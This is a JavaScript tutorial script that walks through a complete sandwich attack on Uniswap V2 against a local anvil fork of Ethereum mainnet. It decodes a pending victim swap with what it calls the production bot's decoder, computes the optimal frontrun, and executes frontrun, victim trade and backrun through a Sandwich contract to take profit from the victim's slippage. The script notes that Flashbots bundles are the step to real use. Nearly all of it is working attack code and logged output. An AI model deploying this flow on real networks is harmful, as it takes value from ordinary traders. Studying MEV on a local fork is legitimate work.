/**
 * Anvil Fork Mainnet Sandwich Attack Tutorial Script
 *
 * Demonstrates a complete sandwich attack flow against a local anvil
 * fork of mainnet. No real ETH needed, no Flashbots relay required.
 * Every step prints detailed logs for teaching purposes.
 *
 * Usage:
 *   1. Start anvil fork: anvil --fork-url <mainnet_rpc_url>
 *   2. Run the test: node bot/test/fork-sandwich.js
 */

import { ethers, formatUnits, parseUnits } from "ethers";
import { createRequire } from "module";

const require = createRequire(import.meta.url);

// Sandwich contract fallback payload semantics (see contracts/src/Sandwich.sol):
//   - token:      token transferred INTO the pair (fallback runs token.transfer(pair, amountIn))
//   - pair:       the Univ2 pair being sandwiched
//   - amountIn:   amount given
//   - amountOut:  amount taken out
//   - tokenOutNo: whether the taken token is token0 or token1 (0 = token0, 1 = token1)
//
// Note: bot/src/univ2.js transitively imports bot/src/constants.js, which checks
// env vars at import time and calls process.exit(1) when any is missing. Fill in
// defaults pointing at the local anvil first, then import dynamically, so that
// `npm run test:fork` works out of the box.
process.env.RPC_URL ??= "http://127.0.0.1:8545";
process.env.RPC_URL_WSS ??= "ws://127.0.0.1:8545";
process.env.PRIVATE_KEY ??= "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
process.env.FLASHBOTS_AUTH_KEY ??=
  "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
process.env.SANDWICH_CONTRACT ??= ethers.ZeroAddress;

// Import existing modules
import { logError, logInfo, logSuccess, logWarn } from "../src/logging.js";
import { parseUniv2RouterTx } from "../src/parse.js";

const { getUniv2PairAddress } = await import("../src/univ2.js");
const { calcSandwichOptimalIn, calcSandwichState } = await import("../src/numeric.js");

// Load the compiled Sandwich contract
const SandwichArtifact = require("../../contracts/out/Sandwich.sol/Sandwich.json");

// Mainnet address constants
const CONTRACTS = {
  UNIV2_ROUTER: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
  WETH: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
  USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
};

// Minimal ERC20 ABI
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

// WETH ABI (includes deposit)
const WETH_ABI = [...ERC20_ABI, "function deposit() payable"];

// UniswapV2 Pair ABI (only getReserves is needed)
const PAIR_ABI = ["function getReserves() view returns (uint112, uint112, uint32)"];

// UniswapV2 Router ABI (only the functions we need)
const ROUTER_ABI = [
  "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) payable returns (uint[] memory amounts)",
  "function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)",
];

// Sandwich contract ABI (only recoverERC20 is needed)
const SANDWICH_ABI = ["function recoverERC20(address token)"];

// Helper: print a divider line
const printDivider = () => {
  logInfo("=".repeat(80));
};

// Helper: print a sub-divider line
const printSubDivider = () => {
  logInfo("-".repeat(80));
};

// Helper: format ETH
const fmtEth = (wei) => `${formatUnits(wei, 18)} ETH`;

// Helper: format an address
const fmtAddr = (addr) => `${addr.slice(0, 6)}...${addr.slice(-4)}`;

// Helper: token position in the pair (token0 = 0, token1 = 1)
const tokenNo = (token, other) => (BigInt(token) < BigInt(other) ? 0 : 1);

// Helper: compute the WETH/USDC price (convert to human-readable units first
// to avoid bigint precision issues)
const calcPrice = (reserveWeth, reserveToken) =>
  Number(formatUnits(reserveToken, 6)) / Number(formatUnits(reserveWeth, 18));

// Helper: read pair reserves (returned in tokenA/tokenB order)
const getReserves = async (pairContract, tokenA, tokenB) => {
  const [reserve0, reserve1] = await pairContract.getReserves();
  if (BigInt(tokenA) < BigInt(tokenB)) {
    return [reserve0, reserve1];
  }
  return [reserve1, reserve0];
};

// Helper: wait for a tx to be mined (with timeout, so fork RPC
// jitter can never hang the script forever). Anvil automines,
// so one poll is enough under normal conditions.
const waitTx = async (provider, tx, label, timeoutMs = 60000) => {
  const receipt = await provider.waitForTransaction(tx.hash, 1, timeoutMs);
  if (receipt === null) {
    throw new Error(`${label} timed out after ${timeoutMs}ms, tx may not be mined: ${tx.hash}`);
  }
  if (receipt.status !== 1) {
    throw new Error(`${label} execution failed (status=0): ${tx.hash}`);
  }
  return receipt;
};

// Main function
const main = async () => {
  printDivider();
  logSuccess("  Anvil Fork Mainnet Sandwich Attack Tutorial");
  printDivider();
  logInfo("");

  // =============================================================================
  // Step 1: Connect to the anvil fork
  // =============================================================================
  logInfo("Step 1: Connect to the local Anvil fork node...");
  logInfo("");

  const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

  // Verify the connection
  try {
    const blockNumber = await provider.getBlockNumber();
    logSuccess(`  [OK] Connected to Anvil fork, current block: ${blockNumber}`);
  } catch {
    logError("  [FAIL] Cannot connect to the Anvil node. Make sure an anvil fork is running:");
    logError("");
    logError("    anvil --fork-url <mainnet_rpc_url>");
    logError("");
    logError("  Example:");
    logError("    anvil --fork-url https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY");
    process.exit(1);
  }

  // =============================================================================
  // Step 2: Set up accounts
  // =============================================================================
  logInfo("");
  printDivider();
  logInfo("Step 2: Set up the Searcher and Victim accounts...");
  logInfo("");

  // Note: anvil default accounts may carry EIP-7702 delegation code on a
  // mainnet fork, which breaks transactions sent from them. So generate fresh
  // random accounts here and fund them via anvil_setBalance (test ETH is just
  // a number, no real transfer needed).
  const searcherWallet = ethers.Wallet.createRandom().connect(provider);
  const victimWallet = ethers.Wallet.createRandom().connect(provider);

  logInfo(`  Searcher address: ${searcherWallet.address} (freshly generated)`);
  logInfo(`  Victim address:   ${victimWallet.address} (freshly generated)`);

  logInfo("  Funding both new accounts with 500 ETH via anvil_setBalance...");
  await provider.send("anvil_setBalance", [
    searcherWallet.address,
    `0x${parseUnits("500", 18).toString(16)}`,
  ]);
  await provider.send("anvil_setBalance", [
    victimWallet.address,
    `0x${parseUnits("500", 18).toString(16)}`,
  ]);

  // Check account balances
  const searcherBalance = await provider.getBalance(searcherWallet.address);
  const victimBalance = await provider.getBalance(victimWallet.address);
  logInfo(`  Searcher ETH balance: ${fmtEth(searcherBalance)}`);
  logInfo(`  Victim ETH balance:   ${fmtEth(victimBalance)}`);
  logSuccess("  [OK] Both new accounts funded, no historical code on the fork");

  // =============================================================================
  // Step 3: Deploy the Sandwich contract
  // =============================================================================
  logInfo("");
  printDivider();
  logInfo("Step 3: Deploy the Sandwich contract...");
  logInfo("");

  if (!SandwichArtifact.bytecode?.object) {
    logError("  [FAIL] Sandwich contract bytecode not found, run first: npm run build:contracts");
    process.exit(1);
  }

  const sandwichFactory = new ethers.ContractFactory(
    SandwichArtifact.abi,
    SandwichArtifact.bytecode.object,
    searcherWallet,
  );

  logInfo("  Deploying Sandwich contract (owner = Searcher)...");
  const sandwich = await sandwichFactory.deploy(searcherWallet.address);
  await sandwich.waitForDeployment();

  const sandwichAddress = await sandwich.getAddress();
  logSuccess(`  [OK] Sandwich contract deployed: ${sandwichAddress}`);
  logInfo(`  Contract owner: ${searcherWallet.address} (i.e. the Searcher)`);

  // =============================================================================
  // Step 4: Initialize token contracts and pool state
  // =============================================================================
  logInfo("");
  printDivider();
  logInfo("Step 4: Initialize WETH/USDC contracts and the liquidity pool...");
  logInfo("");

  const wethContract = new ethers.Contract(CONTRACTS.WETH, WETH_ABI, searcherWallet);
  const usdcContract = new ethers.Contract(CONTRACTS.USDC, ERC20_ABI, searcherWallet);
  const routerContract = new ethers.Contract(CONTRACTS.UNIV2_ROUTER, ROUTER_ABI, searcherWallet);
  const sandwichContract = new ethers.Contract(sandwichAddress, SANDWICH_ABI, searcherWallet);

  // Compute the WETH-USDC pair address (pure off-chain CREATE2, no RPC call)
  const pairAddress = getUniv2PairAddress(CONTRACTS.WETH, CONTRACTS.USDC);
  logInfo(`  WETH-USDC pair address: ${pairAddress} (off-chain CREATE2 computation)`);

  const pairContract = new ethers.Contract(pairAddress, PAIR_ABI, provider);

  // Read current reserves (real mainnet liquidity via the fork)
  const [reserveWeth, reserveToken] = await getReserves(
    pairContract,
    CONTRACTS.WETH,
    CONTRACTS.USDC,
  );
  logInfo(
    `  Current reserves: WETH = ${formatUnits(reserveWeth, 18)}, USDC = ${formatUnits(reserveToken, 6)}`,
  );

  // Compute the current price
  const currentPrice = calcPrice(reserveWeth, reserveToken);
  logInfo(`  Current WETH/USDC price: ~${currentPrice.toFixed(2)} USDC per WETH`);

  // =============================================================================
  // Step 5: Searcher wraps WETH
  // =============================================================================
  logInfo("");
  printDivider();
  logInfo("Step 5: Searcher wraps WETH (frontrun ammo)...");
  logInfo("");

  // The searcher needs enough WETH for the frontrun (binary search caps at 100 WETH)
  const searcherWethAmount = parseUnits("200", 18);
  logInfo("  Searcher wraps 200 WETH...");
  const wrapTx = await wethContract.deposit({ value: searcherWethAmount });
  await waitTx(provider, wrapTx, "WETH wrap");
  logSuccess("  [OK] Searcher wrapped 200 WETH");

  const searcherWethBal = await wethContract.balanceOf(searcherWallet.address);
  logInfo(`  Searcher WETH balance: ${formatUnits(searcherWethBal, 18)}`);

  logInfo("");
  logInfo("  Note: the Victim uses swapExactETHForTokens and spends native ETH directly,");
  logInfo("  the Router wraps it into WETH internally, so the Victim needs no wrap or approve.");

  // =============================================================================
  // Step 6: Build the victim swapExactETHForTokens tx (hold it, like a mempool tx)
  // =============================================================================
  logInfo("");
  printDivider();
  logInfo("Step 6: Build the Victim swap tx (simulating a pending mempool tx)...");
  logInfo("");

  // The victim swaps 50 WETH -> USDC.
  // In the real world, sandwich victims are usually large trades with loose
  // slippage, which is exactly where the attack margin comes from.
  const victimSwapAmount = parseUnits("50", 18);
  const path = [CONTRACTS.WETH, CONTRACTS.USDC];
  const deadline = Math.floor(Date.now() / 1000) + 600; // expires in 10 minutes

  // How much USDC the victim would get at the current market price
  const amountsOut = await routerContract.getAmountsOut(victimSwapAmount, path);
  logInfo("  Victim plans to swap 50 ETH for USDC");
  logInfo(`  Expected output at current price: ${formatUnits(amountsOut[1], 6)} USDC`);

  // 5% slippage tolerance: the victim's bottom line, and the searcher's attack margin
  const amountOutMin = (amountsOut[1] * 95n) / 100n;
  logInfo(`  amountOutMin (5% slippage tolerance): ${formatUnits(amountOutMin, 6)} USDC`);

  // Only build the tx data, do not send it - just like the bot sees it in the mempool
  const routerAsVictim = new ethers.Contract(CONTRACTS.UNIV2_ROUTER, ROUTER_ABI, victimWallet);
  const victimTxReq = await routerAsVictim.swapExactETHForTokens.populateTransaction(
    amountOutMin,
    path,
    victimWallet.address,
    deadline,
    { value: victimSwapAmount },
  );

  logInfo(`  Victim tx target: Router at ${fmtAddr(CONTRACTS.UNIV2_ROUTER)}`);
  logInfo(`  Victim tx sender: ${fmtAddr(victimWallet.address)}`);
  logSuccess("  [OK] Victim tx built, held back (simulating mempool pending state)");

  // =============================================================================
  // Step 7: Searcher computes sandwich params (mirrors bot/index.js core logic)
  // =============================================================================
  logInfo("");
  printDivider();
  logInfo("Step 7: Searcher computes the optimal sandwich parameters...");
  logInfo("");

  printSubDivider();
  logInfo("  7.1 Decode the victim tx with the bot's decoder...");
  logInfo("");

  // This is exactly the production bot's decode path (bot/src/parse.js)
  const decoded = parseUniv2RouterTx(victimTxReq.data);
  if (decoded === null) {
    logError("  [FAIL] Cannot decode the victim tx, exiting");
    process.exit(1);
  }
  logInfo("  Method: swapExactETHForTokens");
  logInfo(`  amountOutMin: ${formatUnits(decoded.amountOutMin, 6)} USDC`);
  logInfo(`  Path: ${decoded.path.map((p) => fmtAddr(p)).join(" -> ")}`);
  logInfo(`  Recipient: ${decoded.to}`);
  logInfo(`  Input ETH: ${formatUnits(victimSwapAmount, 18)}`);

  printSubDivider();
  logInfo("  7.2 Confirm the pair reserves (pre-attack snapshot)... ");
  logInfo("");

  logInfo(`  Pair address: ${pairAddress}`);
  logInfo(`  WETH reserve: ${formatUnits(reserveWeth, 18)}`);
  logInfo(`  USDC reserve: ${formatUnits(reserveToken, 6)}`);

  printSubDivider();
  logInfo("  7.3 Binary-search the optimal frontrun input...");
  logInfo("");

  // The path is a single WETH -> USDC hop, so the victim's min receive is amountOutMin itself
  const userMinRecv = BigInt(decoded.amountOutMin);
  const userAmountIn = victimSwapAmount;

  logInfo("  Searching the 0 ~ 100 ETH range for the optimal WETH input...");
  logInfo("  Goal: push the price up just enough that the victim only gets amountOutMin");

  const optimalWethIn = calcSandwichOptimalIn(
    BigInt(userAmountIn),
    userMinRecv,
    BigInt(reserveWeth),
    BigInt(reserveToken),
  );

  logInfo(`  Optimal frontrun input: ${formatUnits(optimalWethIn, 18)} WETH`);

  if (optimalWethIn <= 0n) {
    logError("  No valid sandwich params found (slippage too tight or pool too deep), exiting");
    process.exit(1);
  }

  if (optimalWethIn > searcherWethBal) {
    logError(
      `  Optimal input ${formatUnits(optimalWethIn, 18)} WETH exceeds searcher balance, exiting`,
    );
    process.exit(1);
  }

  printSubDivider();
  logInfo("  7.4 Compute the full sandwich state (frontrun / victim / backrun)...");
  logInfo("");

  const sandwichStates = calcSandwichState(
    optimalWethIn,
    BigInt(userAmountIn),
    userMinRecv,
    BigInt(reserveWeth),
    BigInt(reserveToken),
  );

  if (sandwichStates === null) {
    logError("  Sandwich state computation failed (victim would get below minRecv), exiting");
    process.exit(1);
  }

  // Print the sandwich structure
  logInfo("  Sandwich structure:");
  logInfo("");
  logInfo("  [Frontrun] Searcher buys USDC first, pushing the price up:");
  logInfo(`    In: ${formatUnits(optimalWethIn, 18)} WETH`);
  logInfo(`    Out: ${formatUnits(sandwichStates.frontrun.amountOut, 6)} USDC`);
  logInfo("");
  logInfo("  [Victim] Victim is forced to buy USDC at the worse price:");
  logInfo(`    In: ${formatUnits(sandwichStates.userAmountIn, 18)} WETH`);
  logInfo(`    Out: ${formatUnits(sandwichStates.victim.amountOut, 6)} USDC`);
  logInfo("");
  logInfo("  [Backrun] Searcher sells the USDC back to WETH, locking in profit:");
  logInfo(`    In: ${formatUnits(sandwichStates.frontrun.amountOut, 6)} USDC`);
  logInfo(`    Out: ${formatUnits(sandwichStates.backrun.amountOut, 18)} WETH`);
  logInfo("");

  // Revenue estimate (the production bot also subtracts gas and the bribe here;
  // we only show the gross figure)
  const revenue = sandwichStates.backrun.amountOut - optimalWethIn;
  logInfo("  === Revenue estimate (gross, before gas) ===");
  logInfo(`  Frontrun cost: ${formatUnits(optimalWethIn, 18)} WETH`);
  logInfo(`  Backrun proceeds: ${formatUnits(sandwichStates.backrun.amountOut, 18)} WETH`);
  logInfo(`  Gross profit: ${formatUnits(revenue, 18)} WETH`);

  if (revenue <= 0n) {
    logWarn("  Not profitable, aborting (the production bot would skip it too)");
    process.exit(0);
  }

  // =============================================================================
  // Step 8: Execute the sandwich attack (frontrun -> victim -> backrun)
  // =============================================================================
  logInfo("");
  printDivider();
  logInfo("Step 8: Execute the sandwich attack...");
  logInfo("");
  logInfo("  Note: in production a Flashbots bundle guarantees all three txs land");
  logInfo("  atomically in the same block. On a local fork nobody competes with us,");
  logInfo("  so sending them in order is equivalent.");

  // Snapshot balances before the attack
  const searcherWethBefore = await wethContract.balanceOf(searcherWallet.address);
  const victimUsdcBefore = await usdcContract.balanceOf(victimWallet.address);
  const sandwichWethBefore = await wethContract.balanceOf(sandwichAddress);
  const sandwichUsdcBefore = await usdcContract.balanceOf(sandwichAddress);

  printSubDivider();
  logInfo("  8.0 Pre-attack balance snapshot:");
  logInfo("");
  logInfo(`    Searcher WETH: ${formatUnits(searcherWethBefore, 18)}`);
  logInfo(`    Victim USDC:   ${formatUnits(victimUsdcBefore, 6)}`);
  logInfo(`    Sandwich WETH: ${formatUnits(sandwichWethBefore, 18)}`);
  logInfo(`    Sandwich USDC: ${formatUnits(sandwichUsdcBefore, 6)}`);

  // ---- Step 1: Frontrun ----
  logInfo("");
  printSubDivider();
  logInfo("  8.1 Frontrun: WETH -> USDC (push the price up)...");
  logInfo("");

  // Move the WETH into the Sandwich contract first; the fallback forwards it to the pair
  logInfo(`  (i) Transfer ${formatUnits(optimalWethIn, 18)} WETH into the Sandwich contract...`);
  const transferTx = await wethContract.transfer(sandwichAddress, optimalWethIn);
  await waitTx(provider, transferTx, "WETH transfer into Sandwich");
  logSuccess("  [OK] WETH moved into the Sandwich contract");

  // Frontrun: give WETH, take USDC
  // token = WETH (sent into the pair), tokenOutNo = position of USDC in the pair
  const frontTokenOutNo = tokenNo(CONTRACTS.USDC, CONTRACTS.WETH);

  const frontslicePayload = ethers.solidityPacked(
    ["address", "address", "uint128", "uint128", "uint8"],
    [
      CONTRACTS.WETH, // token: token given (sent into the pair)
      pairAddress, // pair: the pair
      optimalWethIn, // amountIn: how much WETH is given
      sandwichStates.frontrun.amountOut, // amountOut: how much USDC is taken
      frontTokenOutNo, // tokenOutNo: USDC is token0 or token1
    ],
  );

  logInfo("  (ii) Call Sandwich.fallback() to run the WETH -> USDC swap...");
  logInfo(`    token (given, into pair): WETH (${fmtAddr(CONTRACTS.WETH)})`);
  logInfo(`    pair: ${fmtAddr(pairAddress)}`);
  logInfo(`    amountIn: ${formatUnits(optimalWethIn, 18)} WETH`);
  logInfo(`    amountOut: ${formatUnits(sandwichStates.frontrun.amountOut, 6)} USDC`);
  logInfo(`    tokenOutNo: ${frontTokenOutNo} (USDC is token${frontTokenOutNo})`);

  const frontsliceTx = await searcherWallet.sendTransaction({
    to: sandwichAddress,
    data: frontslicePayload,
    gasLimit: 250000,
  });
  await waitTx(provider, frontsliceTx, "Frontrun");
  logSuccess("  [OK] Frontrun done! The USDC price has been pushed up");

  // Print post-frontrun state
  const [reserveWethAfterFront, reserveTokenAfterFront] = await getReserves(
    pairContract,
    CONTRACTS.WETH,
    CONTRACTS.USDC,
  );
  const priceAfterFront = calcPrice(reserveWethAfterFront, reserveTokenAfterFront);
  logInfo("");
  logInfo("  Post-frontrun state:");
  logInfo(`    WETH reserve: ${formatUnits(reserveWethAfterFront, 18)}`);
  logInfo(`    USDC reserve: ${formatUnits(reserveTokenAfterFront, 6)}`);
  logInfo(`    New price: ~${priceAfterFront.toFixed(2)} USDC per WETH`);
  logInfo(
    `    USDC now costs ${(((currentPrice - priceAfterFront) / priceAfterFront) * 100).toFixed(2)}% more WETH (victim pays more per USDC)`,
  );

  // ---- Step 2: Victim Transaction ----
  logInfo("");
  printSubDivider();
  logInfo("  8.2 Victim tx: the victim trades at the manipulated price...");
  logInfo("");

  logInfo("  Victim sends the swap tx (50 ETH -> USDC)...");
  logInfo("  Note: the victim now faces the post-frontrun, inflated price");

  const victimSwapTx = await routerAsVictim.swapExactETHForTokens(
    amountOutMin,
    path,
    victimWallet.address,
    deadline,
    { value: victimSwapAmount, gasLimit: 300000 },
  );
  await waitTx(provider, victimSwapTx, "Victim swap");
  logSuccess("  [OK] Victim tx executed");

  // How much USDC the victim actually received
  const victimUsdcAfter = await usdcContract.balanceOf(victimWallet.address);
  const victimUsdcReceived = victimUsdcAfter - victimUsdcBefore;
  logInfo("");
  logInfo(`  Victim actually received: ${formatUnits(victimUsdcReceived, 6)} USDC`);
  logInfo(`  Without attack it would get: ${formatUnits(amountsOut[1], 6)} USDC`);
  logInfo(
    `  Value extracted from victim: ${formatUnits(amountsOut[1] - victimUsdcReceived, 6)} USDC`,
  );

  // ---- Step 3: Backrun ----
  logInfo("");
  printSubDivider();
  logInfo("  8.3 Backrun: USDC -> WETH (lock in the profit)...");
  logInfo("");

  // Backrun: give USDC (just received from the frontrun), take WETH
  // token = USDC (sent into the pair), tokenOutNo = position of WETH in the pair
  const backTokenOutNo = tokenNo(CONTRACTS.WETH, CONTRACTS.USDC);

  const backslicePayload = ethers.solidityPacked(
    ["address", "address", "uint128", "uint128", "uint8"],
    [
      CONTRACTS.USDC, // token: token given (sent into the pair)
      pairAddress, // pair: the pair
      sandwichStates.frontrun.amountOut, // amountIn: how much USDC is given
      sandwichStates.backrun.amountOut, // amountOut: how much WETH is taken
      backTokenOutNo, // tokenOutNo: WETH is token0 or token1
    ],
  );

  logInfo("  (i) Call Sandwich.fallback() to run the USDC -> WETH swap...");
  logInfo(`    token (given, into pair): USDC (${fmtAddr(CONTRACTS.USDC)})`);
  logInfo(`    pair: ${fmtAddr(pairAddress)}`);
  logInfo(`    amountIn: ${formatUnits(sandwichStates.frontrun.amountOut, 6)} USDC`);
  logInfo(`    amountOut: ${formatUnits(sandwichStates.backrun.amountOut, 18)} WETH`);
  logInfo(`    tokenOutNo: ${backTokenOutNo} (WETH is token${backTokenOutNo})`);

  const backsliceTx = await searcherWallet.sendTransaction({
    to: sandwichAddress,
    data: backslicePayload,
    gasLimit: 250000,
  });
  await waitTx(provider, backsliceTx, "Backrun");
  logSuccess("  [OK] Backrun done! USDC swapped back to WETH");

  // ---- Step 4: Recover the profit ----
  logInfo("");
  printSubDivider();
  logInfo("  8.4 Recover profit: pull the WETH back from Sandwich to Searcher...");
  logInfo("");

  const recoverTx = await sandwichContract.recoverERC20(CONTRACTS.WETH);
  await waitTx(provider, recoverTx, "Profit recovery");
  logSuccess("  [OK] Profit pulled back into the searcher wallet");

  // =============================================================================
  // Step 9: Result analysis
  // =============================================================================
  logInfo("");
  printDivider();
  logInfo("Step 9: Sandwich attack result analysis...");
  logInfo("");

  // Record post-attack balances
  const searcherWethAfter = await wethContract.balanceOf(searcherWallet.address);
  const sandwichWethAfter = await wethContract.balanceOf(sandwichAddress);

  printSubDivider();
  logInfo("  9.1 Balance comparison before/after the attack:");
  logInfo("");

  // Comparison table
  const fmtCompare = (before, after, decimals) => {
    const diff = after - before;
    const sign = diff >= 0 ? "+" : "";
    const formatted = `${formatUnits(before, decimals)} -> ${formatUnits(after, decimals)} (${sign}${formatUnits(diff, decimals)})`;
    return formatted;
  };

  logInfo("  +----------------+------------------------------------------------+");
  logInfo("  | Account        | Balance change                                 |");
  logInfo("  +----------------+------------------------------------------------+");
  logInfo(
    `  | Searcher WETH  | ${fmtCompare(searcherWethBefore, searcherWethAfter, 18).padEnd(46)}|`,
  );
  logInfo(
    `  | Sandwich WETH  | ${fmtCompare(sandwichWethBefore, sandwichWethAfter, 18).padEnd(46)}|`,
  );
  logInfo(`  | Victim USDC    | ${fmtCompare(victimUsdcBefore, victimUsdcAfter, 6).padEnd(46)}|`);
  logInfo("  +----------------+------------------------------------------------+");

  printSubDivider();
  logInfo("  9.2 Profit analysis:");
  logInfo("");

  logInfo("  === Flow summary ===");
  logInfo("");
  logInfo("  [Frontrun] Searcher buys USDC with WETH -> pushes the USDC price up");
  logInfo("  [Victim]   Victim buys USDC at the high price -> suffers slippage loss");
  logInfo("  [Backrun]  Searcher sells USDC back to WETH -> takes profit");
  logInfo("  [Recover]  Profit pulled from Sandwich contract to searcher wallet");
  logInfo("");

  const netProfit = searcherWethAfter - searcherWethBefore;
  logInfo("  === Profit (on-chain result, gas already deducted) ===");
  logInfo(`  Searcher put into Sandwich: ${formatUnits(optimalWethIn, 18)} WETH`);
  logInfo(`  Searcher got back in total: ${formatUnits(optimalWethIn + netProfit, 18)} WETH`);
  logInfo(`  Net profit:                 ${formatUnits(netProfit, 18)} WETH`);
  logInfo("");

  if (netProfit > 0n) {
    logSuccess("  [OK] Sandwich attack succeeded! The searcher made a profit");
  } else {
    logWarn("  [FAIL] No profit this time (gas cost exceeded the revenue)");
  }

  printSubDivider();
  logInfo("  9.3 Price impact analysis:");
  logInfo("");

  const [finalReserveWeth, finalReserveToken] = await getReserves(
    pairContract,
    CONTRACTS.WETH,
    CONTRACTS.USDC,
  );
  const finalPrice = calcPrice(finalReserveWeth, finalReserveToken);

  logInfo(`  Pre-attack price: ~${currentPrice.toFixed(2)} USDC per WETH`);
  logInfo(`  Post-frontrun:    ~${priceAfterFront.toFixed(2)} USDC per WETH`);
  logInfo(`  Post-attack price: ~${finalPrice.toFixed(2)} USDC per WETH`);
  logInfo("");
  logInfo("  Note: the frontrun pushes the price up and the backrun pushes it back,");
  logInfo("  so the price ends up close to where it started. The profit comes");
  logInfo("  from the slippage the victim suffers.");

  // =============================================================================
  // Summary
  // =============================================================================
  logInfo("");
  printDivider();
  logSuccess("  Tutorial complete!");
  printDivider();
  logInfo("");
  logInfo("  Key takeaways:");
  logInfo("  1. Frontrun: buy before the victim, push the price up");
  logInfo("  2. Victim:   victim buys at the worse price, suffers slippage loss");
  logInfo("  3. Backrun:  sell the previously bought tokens, take profit");
  logInfo("  4. Profit source: not created from thin air, extracted from the victim");
  logInfo("  5. Real-world constraint: MEV infra like Flashbots is needed for atomicity");
  logInfo("");
  logInfo("  That is how a sandwich attack works.");
  logInfo("");

  // Close the provider connection, otherwise the process would not exit
  provider.destroy();
  process.exit(0);
};

// Run the main function
void main().catch((e) => {
  logError("Script failed:", e.message);
  if (e.reason) {
    logError("Reason:", e.reason);
  }
  process.exit(1);
});
